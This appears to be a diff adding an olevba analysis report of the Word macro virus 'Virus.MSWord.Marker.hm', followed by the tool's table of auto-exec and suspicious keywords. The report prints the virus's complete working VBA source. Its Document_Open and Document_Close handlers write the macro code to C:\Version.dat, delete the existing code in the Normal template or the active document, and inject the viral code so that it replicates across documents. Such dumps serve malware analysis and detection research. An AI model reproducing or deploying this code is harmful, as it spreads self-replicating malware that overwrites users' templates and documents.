@@ -1,0 +1,206 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: Virus.MSWord.Marker.hm
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: Virus.MSWord.Marker.hm - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_Open()
+
+    On Error Resume Next
+    
+    Const Marker = "<- this is a new killer!"
+    
+    'Declare Variables
+    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
+    Dim ad, nt As Object, iCount As Integer
+    Dim OurCode, UserAddress, LogData, LogFile As String
+    
+    'Initialize Variables
+    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
+    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
+    
+    DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
+    NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
+    
+    If ActiveDocument.VBProject.VBComponents.Count > 1 Then
+        DocumentInfected = False
+    End If
+    
+    If NormalTemplate.VBProject.VBComponents.Count > 1 Then
+        If NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.CountOfLines > 2 Then
+                NormalTemplateInfected = False
+        End If
+    End If
+    
+    'Switch the VirusProtection ON
+    Options.VirusProtection = True
+    
+    'write to file
+    If DocumentInfected = True Then
+        If NormalTemplateInfected = False Then
+           Kill "C:\Version.dat"
+           Open "C:\Version.dat" For Output As #1
+           OurCode = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
+           Print #1, OurCode
+           Close #1
+           
+           iCount = NormalTemplate.VBProject.VBComponents.Count
+           For i = 1 To iCount
+               NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.CountOfLines
+           Next i
+           
+    '       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, _
+                                   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+           NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Version.dat"
+           NormalTemplate.Save
+        End If
+    End If
+    
+    If NormalTemplateInfected = True Then
+        If DocumentInfected = False Then
+            Kill "C:\Version.dat"
+            Open "C:\Version.dat" For Output As #1
+            OurCode = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
+            Print #1, OurCode
+            Close #1
+            
+            iCount = NormalTemplate.VBProject.VBComponents.Count
+            For i = 1 To iCount
+                ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.CountOfLines
+            Next i
+    
+            'ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, _
+                                                        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+            ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Version.dat"
+            ActiveDocument.Save
+        End If
+    End If
+End Sub
+
+Private Sub Document_Close()
+
+    On Error Resume Next
+    
+    Const Marker = "<- this is a new killer!"
+    
+    'Declare Variables
+    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
+    Dim ad, nt As Object, iCount As Integer
+    Dim OurCode, UserAddress, LogData, LogFile As String
+    
+    'Initialize Variables
+    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
+    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
+    
+    DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
+    NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
+    
+    If ActiveDocument.VBProject.VBComponents.Count > 1 Then
+        DocumentInfected = False
+    End If
+    
+    If NormalTemplate.VBProject.VBComponents.Count > 1 Then
+        If NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.CountOfLines > 2 Then
+                NormalTemplateInfected = False
+        End If
+    End If
+    
+    'Switch the VirusProtection ON
+    Options.VirusProtection = True
+    
+    'write to file
+    If DocumentInfected = True Then
+        If NormalTemplateInfected = False Then
+           Kill "C:\Version.dat"
+           Open "C:\Version.dat" For Output As #1
+           OurCode = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
+           Print #1, OurCode
+           Close #1
+           
+           iCount = NormalTemplate.VBProject.VBComponents.Count
+           For i = 1 To iCount
+               NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(i).CodeModule.CountOfLines
+           Next i
+           
+    '       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, _
+                                   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+           NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Version.dat"
+           NormalTemplate.Save
+        End If
+    End If
+    
+    If NormalTemplateInfected = True Then
+        If DocumentInfected = False Then
+            Kill "C:\Version.dat"
+            Open "C:\Version.dat" For Output As #1
+            OurCode = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
+            Print #1, OurCode
+            Close #1
+            
+            iCount = NormalTemplate.VBProject.VBComponents.Count
+            For i = 1 To iCount
+                ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(i).CodeModule.CountOfLines
+            Next i
+    
+            'ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, _
+                                                        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+            ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile "C:\Version.dat"
+            ActiveDocument.Save
+        End If
+    End If
+End Sub
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Document_Close      |Runs when the Word document is closed        |
+|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
+|          |                    |opened                                       |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|write               |May write to a file (if combined with Open)  |
+|Suspicious|Output              |May write to a file (if combined with Open)  |
+|Suspicious|Print #             |May write to a file (if combined with Open)  |
+|Suspicious|Kill                |May delete a file                            |
+|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
+|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
+|          |                    |modification)                                |
++----------+--------------------+---------------------------------------------+
+
